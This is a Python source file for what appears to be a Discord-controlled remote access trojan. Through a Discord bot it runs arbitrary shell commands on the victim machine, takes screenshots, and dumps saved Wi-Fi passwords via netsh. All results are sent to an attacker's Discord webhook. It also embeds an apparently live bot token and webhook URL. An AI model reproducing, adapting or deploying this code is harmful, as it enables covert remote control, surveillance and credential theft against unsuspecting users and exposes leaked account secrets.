import os
import subprocess
import discord
from discord_webhook import DiscordWebhook
import pyautogui
import datetime
import time


TOKEN = "MTE5NTMzMTE1NzEwNjEwMjMzNA.G9IMv5.gaZq6AofRr_kZOgtv5GojC5HnFA3niGjFaM4s0"

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('command'):
        await message.channel.send('Sent command!')
        command = message.content
        command = command.replace('command ', '')
        # os.system(command)
        hmm = subprocess.check_output(command,stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8')
        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content=hmm)
        response = webhook.execute()
        out = hmm
        out = out.replace('Ã', '├')
        out = out.replace('Ä', '─')
        print(out)
    
    elif message.content.startswith('com'):
        await message.channel.send('Sent command!')
        command = message.content
        command = command.replace('com ', '')
        os.system(command)
        
        
        
        
        
    elif message.content.startswith('screenshot'):
        time_now = datetime.datetime.now()
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save("help.png")
        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content="Screenshot taken at " + str(time_now))
        with open("./help.png", "rb") as f:
            webhook.add_file(file=f.read(), filename="help.png")
        response = webhook.execute()
        os.remove("./help.png")

        
    elif message.content.startswith('wifi'):
        networks, out = [], ''
        wifis = []
        try:
            wifi = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
            wifi = [i.split(":")[1][1:-1]
                    for i in wifi if "All User Profile" in i]
            wifis = len(networks)
            for name in wifi:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1]
                                for b in results if "Key Content" in b]
                    
                except subprocess.CalledProcessError:
                    networks.append((name, ''))
                    continue

                try:
                    networks.append((name, results[0]))
                except IndexError:
                    networks.append((name, ''))

        except subprocess.CalledProcessError:
            pass
        except UnicodeDecodeError:
            pass

        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
        out += f'{"-"*20}|{"-"*29}\n'
        for name, password in networks:
            out += '{:<20}| {:<}\n'.format(name, password)
        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content="`"+ out + "`")
        response = webhook.execute()


        
        
        
        
        
        


client.run(TOKEN)